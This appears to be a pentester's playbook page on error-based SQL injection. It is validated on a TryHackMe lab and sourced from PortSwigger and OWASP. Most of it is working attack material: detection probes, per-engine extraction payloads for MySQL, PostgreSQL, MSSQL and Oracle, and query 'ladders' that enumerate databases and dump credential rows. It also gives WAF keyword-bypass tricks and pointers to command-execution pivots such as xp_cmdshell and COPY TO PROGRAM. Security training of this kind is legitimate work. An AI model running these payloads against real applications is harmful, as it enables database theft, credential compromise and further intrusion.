
> **STATUS: AUDITED** — first-principles + primary-source derivation (PortSwigger; OWASP WSTG 4.7.5). Detection (Step 1) via `~/scripts/sqli_error_harvest.py` (test-backed). Live-validated 2026-09-30 on THM Modern Web Stacks: Step 1 wiring + the mysql extraction path. Postgres/SQLite sandbox-executed 2026-09-29; mssql/oracle syntax-verified only. Per-section tags carry the detail. Not CANONICAL — mssql/oracle unexecuted, postgres not web-validated, mysql partial.

Reached when a user-controlled parameter is a candidate for SQL injection and the app returns DB error text in-band. Extracts data by forcing the database into an error whose message contains the value you asked for.

⚠️ **Hard precondition — the database error must reach the HTTP response.** Error-based extraction has no oracle without it. Confirmed in Step 1 (the harvester reports `BACKEND: unknown` with no `QUERY` line when no DB error surfaces). Error suppressed / generic 500 page → this technique is inapplicable → [[Time-Based Blind SQL Injection (MySQL) BURP]] (blind path).

---

## Variables

- `<inj_param>` — the injectable parameter.

⚠️ Placeholder(s) — paste literally; never assign to shell `$vars` (spaced payloads word-split).

---

## Step 1 — Probe: does an error surface, which engine, which context?

Paste each breaker into `<inj_param>` one at a time (append to your own working request from input-surface enum); pipe each through the harvester. Breakers (`'` ,`"`, `)`), prefixed with marker token, `sqizzz`, in order to pin the injection point deterministically; the breaker still fires the error:

- `sqizzz'`
- `sqizzz"`
- `sqizzz)`

`<your injected request> | tee /tmp/sqli_resp.html | ~/scripts/sqli_error_harvest.py --marker sqizzz`

##### Harvester output:

```
BACKEND: mysql|postgres|mssql|oracle|sqlite|unknown
STACK_VERSION: <framework/runtime/db version(s)>   (omitted if none found)
QUERY: <reflected SQL>                              (omitted if none found)
CONTEXT: orderby|groupby|having|limit|where-string|where-numeric|unknown
CONTEXT_BASIS: pg-caret|error-near|last-clause|marker|none
```

- First breaker whose run shows `BACKEND` set OR a `QUERY` line → error-based viable; keep that request → route below.
- Every breaker clean (`BACKEND: unknown`, no `QUERY`) → no in-band error → **error-based inapplicable** → [[Time-Based Blind SQL Injection (MySQL) BURP]]. Stop.

##### Set `<backend>` (from the `BACKEND` line):

- `BACKEND: sqlite` → **no error-based extraction vector exists** (permissive typing: `CAST` of text to INTEGER returns `0`, `1/0` returns NULL; raw token errors reflect no query — verified) → [[Time-Based Blind SQL Injection (MySQL) BURP]] / boolean-blind. Stop.
- `BACKEND:` set (`mysql`|`postgres`|`mssql`|`oracle`) → set `<backend>`. `STACK_VERSION` present → re-fire [[Web Attack Checksheet#Version-discovery route]].
- `BACKEND: unknown` with an error present (a `QUERY` line, or DB error text in the response) → signature didn't match → carry `<backend>` unknown; in Step 3 try each backend's extraction form in order `mysql → postgres → mssql → oracle`, the one that leaks confirms it.

##### Set `<context>` from the `CONTEXT` line: 

The harvester owns detection and `CONTEXT_BASIS` only records how it derived it. Map to the Step 3 attachment:

- `where-string` → `<context>` = `string` → **Step 3** (skip Step 2)
- `where-numeric` → `<context>` = `numeric` → **Step 3** (skip Step 2)
- `orderby` → `<context>` = `orderby` → **Step 3** (skip Step 2)
- `unknown` (no query reflected) → **Step 2** (break-and-fix recovers context live)
- `groupby` / `having` / `limit` → no dedicated Step 4 attachment yet (build-when-encountered) → **Step 2** to establish the boundary manually

> `CONTEXT_BASIS: marker` confirms the token landed — the deterministic path. Anything else (`pg-caret`/`error-near`/`last-clause`) means the token didn't reflect (terse error, or the app didn't echo it) and the harvester used a fallback basis; still trust the `CONTEXT` line. `none` → no context derived → Step 2.

---

## Step 2 — Context (terse-error branch)

Reached only when Step 1's harvester could not pin context — the error is terse (no reflected query for the parser to read), so context is recovered by a live break-and-fix oracle dance instead. Two probes, in order; first match wins. Both key off whether a DB error appears/clears (read via the harvester's `BACKEND` line — set = error present, `unknown` + no `QUERY` = clear), so they work even when the param does not change visible output — the usual case for a sort param. `<comment>` = the backend's comment token (`-- -`, or `#` on mysql if `-- ` is stripped).

Verified end-to-end (postgres): string `' -- -` clears the error; numeric `' -- -` still errors; orderby `999` throws the sort-position error.

### Probe A — ORDER BY? (paste + grep)

Paste into `<inj_param>`:

- `999`

Grep the response for an out-of-range sort error (all backends):

`curl -s '<request with <inj_param>=999>' | grep -ioE "Unknown column '[0-9]+' in 'order clause'|ORDER BY position [0-9]+ is not in select list|ORDER BY term out of range|is out of range of the number of items in the select list|ORA-01785"`

- Grep hits → **orderby**. Decisive — no other context throws an out-of-range sort error. Set `<context>` = `orderby`. Done.
- Grep empty → not a sort key (or an ORM/expression builder that ignores integer ordinals) → Probe B.

> mysql / mssql / oracle strings asserted from standard errors — not executed in build (oracle lowest confidence). postgres + sqlite executed. Confirm your backend's on-target.

### Probe B — string vs numeric (break-and-fix)

Paste each into `<inj_param>`, pipe each through the harvester and read the `BACKEND` line:

- `'`
- `' <comment>` (e.g. `' -- -`)

Route:

- `'` surfaces an error (`BACKEND` set) AND `' <comment>` **clears** it (`BACKEND: unknown`, no `QUERY`) → **string**. Set `<context>` = `string`.
- `'` clean, OR the error **persists** after `' <comment>` → **numeric**. Set `<context>` = `numeric`. (orderby already excluded by Probe A.)

---

## Step 3 — Extraction (per backend)

You hold `<backend>` (Step 1) and `<context>` (Step 1 or Step 2). Go to your backend below — each section is self-contained; run it top-to-bottom.

### 3.1 `mysql` (MySQL / MariaDB)

> ✅ **executed (partial)** 2026-09-30 — on MySQL 8.0.45 (THM Modern Web Stacks): `updatexml` default vector + the python leak-read + `orderby` attach validated end-to-end; ladder rungs version / current-DB / tables / columns all leaked cleanly (empty tables correctly returned `NO LEAK`). ⚠ NOT yet exercised: the `current_user()` and `schemata` rungs, a populated multi-column row-data leak (auth_user was empty — no real row/hash dumped), the 32-char `substring` chunking, and the `FLOOR(RAND)` fallback vector.

**Run:** Insert **vector** at `<inj_param>` value, as per the `<context>` mode in **attach**, below. Then walk the ladder in order. Read the leak from the error. Wide row → concat the columns into one leak.

###### **Vector — `updatexml` (default, single function):**

`updatexml(1,concat(0x7e,(<extract_query>)),1)` 

→ read the leak, append:

`<your injected request> | python3 -c 'import sys,html,re; t=html.unescape(sys.stdin.read()); m=re.search(r"XPATH syntax error: \x27~(.*?)\x27", t); print(m.group(1) if m else "NO LEAK")'`

⚠️ **32-char truncation.** `updatexml` truncates the leak at 32 chars. Long values (hashes) → chunk across requests with `substring((<extract_query>),1,32)` then `substring((<extract_query>),33,32)`, OR use the `FLOOR` vector below (no limit).

###### **Vector (fallback) — `FLOOR(RAND)` double-query (no length limit):**

`(SELECT 1 FROM (SELECT COUNT(*),CONCAT((<extract_query>),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x)a)` → leak in `Duplicate entry '<value>:1' for key 'group_key'`.

###### **Concat (fallback - wide rows):** 

`CONCAT(<col_a>,0x3a,<col_b>)` → leaks `<col_a>:<col_b>` in one error.

###### **Attach** (`<payload>` = a vector line above; `<comment>` = `-- -`, or `#` if `-- ` is stripped):

- `<context>` = string → `' <payload> <comment>`
- `<context>` = numeric → `(<payload>)`
- `<context>` = orderby → the vector is itself the sort expression — inject `<payload>` directly.

###### **Ladder** (`<extract_query>` per rung):

Multi-row rung → re-fire advancing `<n>` (`0`,`1`,`2`…) until the error names no new value.

- version → `SELECT @@version`
- current user → `SELECT current_user()`
- current DB → `SELECT database()` _(fills `<db>` below)_
- databases (all) → `SELECT schema_name FROM information_schema.schemata LIMIT <n>,1`
- tables → `SELECT table_name FROM information_schema.tables WHERE table_schema='<db>' LIMIT <n>,1`
- columns → `SELECT column_name FROM information_schema.columns WHERE table_schema='<db>' AND table_name='<tbl>' LIMIT <n>,1`
- row data → `SELECT CONCAT(<col_a>,0x3a,<col_b>) FROM <db>.<tbl> LIMIT <n>,1` _(single col: `SELECT <col> FROM <db>.<tbl> LIMIT <n>,1`)_

### 3.2 `postgres` (PostgreSQL)

> ✅ **executed** 2026-09-29 — CAST data-leak, conditional error, multi-row guard, multi-column concat, numeric/string/ORDER BY context, OFFSET row-walk all verified against PostgreSQL 16.

**Run:** Insert **vector** at `<inj_param>` value, as per the `<context>` mode in **attach**, below. Then walk the ladder in order. Read the leak from the error. Wide row → concat the columns into one leak.

###### **Vector — `CAST` type-error (default, data leak, no length limit):**

`CAST((<extract_query>) AS int)`

→ read the leak, append:

`<your injected request> | python3 -c 'import sys,html,re; t=html.unescape(sys.stdin.read()); m=re.search(r"invalid input syntax for type integer: \x22(.*?)\x22", t); print(m.group(1) if m else "NO LEAK")'`

###### **Vector (conditional) — yes/no oracle (no data leak):**

`1=(SELECT CASE WHEN (<condition>) THEN CAST(1/(SELECT 0) AS int) ELSE 1 END)` → TRUE → `division by zero`; FALSE → normal response. (Verified both branches.)

###### **Concat (wide rows):**

`<col_a>||':'||<col_b>` → leaks `<col_a>:<col_b>` in one error.

###### **Attach** (`<payload>` = a vector line above; `<comment>` = `-- -`):

- `<context>` = string → `' <payload> <comment>`
- `<context>` = numeric → `(<payload>)`
- `<context>` = orderby → `(SELECT <payload>)`, i.e. `ORDER BY (SELECT CAST(...))` — both data-leak and conditional-error forms fire from `ORDER BY (SELECT ...)` with no quote-break (verified)

###### **Ladder** (`<extract_query>` per rung):

Multi-row rung → re-fire advancing `<n>` (`0`,`1`,`2`…) until the error names no new value.

- version → `SELECT version()`
- current user → `SELECT current_user`
- current DB → `SELECT current_database()`
- databases (all) → `SELECT datname FROM pg_database OFFSET <n> LIMIT 1`
- tables → `SELECT table_name FROM information_schema.tables WHERE table_schema='public' OFFSET <n> LIMIT 1`
- columns → `SELECT column_name FROM information_schema.columns WHERE table_name='<tbl>' OFFSET <n> LIMIT 1`
- row data → `SELECT <col_a>||':'||<col_b> FROM <tbl> OFFSET <n> LIMIT 1` _(single col: `SELECT <col> FROM <tbl> OFFSET <n> LIMIT 1`)_

### 3.3 `mssql` (Microsoft SQL Server)

> ⚠ **unexecuted** — syntax from PortSwigger primary source; not run against a live engine in build. Confirm on target (the read one-liner matches the documented error format but is untested against real MSSQL).

**Run:** Insert **vector** at `<inj_param>` value, as per the `<context>` mode in **attach**, below. Then walk the ladder in order. Read the leak from the error. Wide row → concat the columns into one leak.

###### **Vector — `CONVERT`/`CAST` type-error (default, data leak):**

`1=CONVERT(int,(<extract_query>))`

→ read the leak, append:

`<your injected request> | python3 -c 'import sys,html,re; t=html.unescape(sys.stdin.read()); m=re.search(r"Conversion failed when converting the varchar value \x27(.*)\x27 to data type int", t); print(m.group(1) if m else "NO LEAK")'`

###### **Vector (conditional) — yes/no oracle (no data leak):**

`1=(SELECT CASE WHEN (<condition>) THEN 1/0 ELSE NULL END)` → TRUE → divide-by-zero error; FALSE → normal.

###### **Concat (wide rows):**

`<col_a>+':'+<col_b>` → leaks `<col_a>:<col_b>` in one error.

###### **Attach** (`<payload>` = a vector line above; `<comment>` = `-- -`):

- `<context>` = string → `' <payload> <comment>`
- `<context>` = numeric → `(<payload>)`
- `<context>` = orderby → `(SELECT <payload>)`

###### **Ladder** (`<extract_query>` per rung):

Multi-row rung → re-fire advancing `<n>` (`0`,`1`,`2`…) until the error names no new value.

- version → `SELECT @@version`
- current user → `SELECT SYSTEM_USER`
- databases (all) → `SELECT name FROM sys.databases ORDER BY name OFFSET <n> ROWS FETCH NEXT 1 ROW ONLY`
- tables → `SELECT table_name FROM information_schema.tables ORDER BY table_name OFFSET <n> ROWS FETCH NEXT 1 ROW ONLY`
- columns → `SELECT column_name FROM information_schema.columns WHERE table_name='<tbl>' ORDER BY column_name OFFSET <n> ROWS FETCH NEXT 1 ROW ONLY`
- row data → `SELECT <col_a>+':'+<col_b> FROM <tbl> ORDER BY <col_a> OFFSET <n> ROWS FETCH NEXT 1 ROW ONLY` _(single col: `SELECT <col> FROM <tbl> ORDER BY <col> OFFSET <n> ROWS FETCH NEXT 1 ROW ONLY`)_

### 3.4 `oracle`

> ⚠ **unexecuted** — syntax from PortSwigger + OWASP primary source; not run against a live engine in build. Confirm on target.

**Run:** Insert **vector** at `<inj_param>` value, as per the `<context>` mode in **attach**, below. Then walk the ladder in order. Read the leak from the error. Wide row → concat the columns into one leak. Every Oracle select needs a `FROM` — use `FROM dual` for constant expressions.

###### **Vector — conditional error (default, reliable form):**

`1=(SELECT CASE WHEN (<condition>) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)` → TRUE → `ORA-01476: divisor is equal to zero`; FALSE → normal.

→ read: this is a **yes/no oracle**, not a value leak — presence of `ORA-01476` = TRUE. Extract char-by-char with `<condition>` = `substr((<extract_query>),<i>,1)='<c>'`. For full boolean/blind extraction, see [[Time-Based Blind SQL Injection (MySQL) BURP]].

###### **Vector (data leak) — type-error (value not always echoed):**

`(<extract_query>)=1` where `<extract_query>` returns a string → `ORA-01722: invalid number`. Oracle does not reliably echo the value in this error — prefer the conditional vector above when it isn't echoed.

###### **Concat (wide rows):**

`<col_a>||':'||<col_b>` → leaks `<col_a>:<col_b>` in one error.

###### **Attach** (`<payload>` = a vector line above; `<comment>` = `-- -`):

- `<context>` = string → `' <payload> <comment>`
- `<context>` = numeric → `(<payload>)`
- `<context>` = orderby → `(SELECT <payload> FROM dual)`

###### **Ladder** (`<extract_query>` per rung):

Multi-row rung → re-fire advancing `<n>` (`0`,`1`,`2`…) until the error names no new value.

- version → `SELECT banner FROM v$version WHERE rownum=1`
- current user → `SELECT user FROM dual`
- tables → `SELECT table_name FROM all_tables OFFSET <n> ROWS FETCH NEXT 1 ROW ONLY`
- columns → `SELECT column_name FROM all_tab_columns WHERE table_name='<TBL>' OFFSET <n> ROWS FETCH NEXT 1 ROW ONLY`
- row data → `SELECT <col_a>||':'||<col_b> FROM <tbl> OFFSET <n> ROWS FETCH NEXT 1 ROW ONLY` _(single col: `SELECT <col> FROM <tbl> OFFSET <n> ROWS FETCH NEXT 1 ROW ONLY`)_

---

## Failure modes

- **Subquery returns >1 row** → distinct error (`more than one row returned by a subquery` / equivalent), no leak. Add the `LIMIT 1` guard. The distinct error IS the diagnostic — you forgot the guard.
- **Value exceeds display limit** (MySQL XPath 32-char) → chunk with `substring` or switch to the no-limit vector for that backend.
- **WAF blocks keywords** (`SELECT`, `UNION`) → case-vary (`SeLeCT`), inline-comment (`SEL/**/ECT`), MySQL versioned comment (`/*!SELECT*/`). See [[Injection]] for encoding bypasses.
- **Quote filtered / stripped** (`string` context) → try numeric-context payloads if the param is also used numerically; use `0x`-hex or `CHAR()` string construction to avoid literal quotes.
- **Error surfaced but value not echoed** (some Oracle/MSSQL conversions) → fall back to conditional-error char-by-char extraction (boolean oracle), or route to [[Time-Based Blind SQL Injection (MySQL) BURP]].
- **Harvester reports `BACKEND` set but `CONTEXT: unknown`** → error is terse (no query reflected) → Step 2 break-and-fix recovers context; the marker only pins context when the query reflects.
- **Step 3 payload won't attach for the detected `<context>`** (no error, or a different error than expected) → a heuristic-basis detection (`CONTEXT_BASIS: error-near`/`last-clause`) may be wrong → drop to Step 2 and re-establish the boundary. If Step 2 disagrees with the harvester, fix the harvester (add a fixture + test), not the playbook.

---

## Decision

- Data extracted (creds, hashes) → crack/reuse: hashes → [[Cracking Hashes]]; plaintext creds → `creds_<host>.txt` accumulator → [[Authenticated Walk]].
- RCE reachable (MySQL `INTO OUTFILE` webroot write / MSSQL `xp_cmdshell` / Postgres `COPY … TO PROGRAM`) → pivot to command execution (out of error-based scope; note the finding and route).
- Error-based blocked (no in-band error, or value not echoed) → [[Time-Based Blind SQL Injection (MySQL) BURP]].
- Injection confirmed but this technique exhausted → return to [[Injection]] for sibling SQLi vectors (UNION / boolean-blind).

---

## Provenance

Payload forms cross-verified against PortSwigger Web Security Academy SQL injection cheat sheet and OWASP WSTG 4.7.5 (per-DBMS SQL Injection pages). No single published exploit — technique is standard corpus. Detection delegated to `~/scripts/sqli_error_harvest.py` (see [[Scripts_Index]]).

---

## Validation

THM:Modern Web Stacks:Task 4 Django